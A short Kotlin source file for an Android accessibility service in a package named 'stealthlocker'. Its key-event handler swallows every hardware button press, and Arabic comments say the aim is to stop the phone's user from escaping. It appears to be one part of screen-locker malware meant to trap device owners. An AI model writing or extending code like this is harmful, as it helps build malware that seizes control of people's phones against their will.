package com.example.stealthlocker

import android.accessibilityservice.AccessibilityService
import android.view.KeyEvent
import android.view.accessibility.AccessibilityEvent

class MyAccessibilityService : AccessibilityService() {

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {}

    override fun onInterrupt() {}

    // اعتراض أزرار الهاتف لمنع الهروب
    override fun onKeyEvent(event: KeyEvent?): Boolean {
        return true // تعني: امنع أي زر من العمل تماماً!
    }
}

